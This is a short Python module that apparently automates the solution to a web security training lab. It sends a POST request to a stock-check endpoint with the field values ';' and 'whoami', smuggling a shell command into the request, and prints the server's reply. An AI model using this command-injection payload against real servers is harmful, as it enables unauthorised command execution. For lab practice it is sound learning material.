from ..utils import *
from bs4 import BeautifulSoup
from urllib.parse import urljoin

import requests


def solve_lab(url, proxies):
    url = urljoin(url, "/product/stock")
    data = {"productId": ";", "storeId": "whoami"}

    print_info(
        f'Performing an OS command injection attack by sending a POST request to "{url}" with the following data:'
    )
    print(f"{data}")

    resp = requests.post(url, proxies=proxies, verify=False, data=data)
    print_success("POST request sent successfully with the following response:\n")
    print(resp.text)
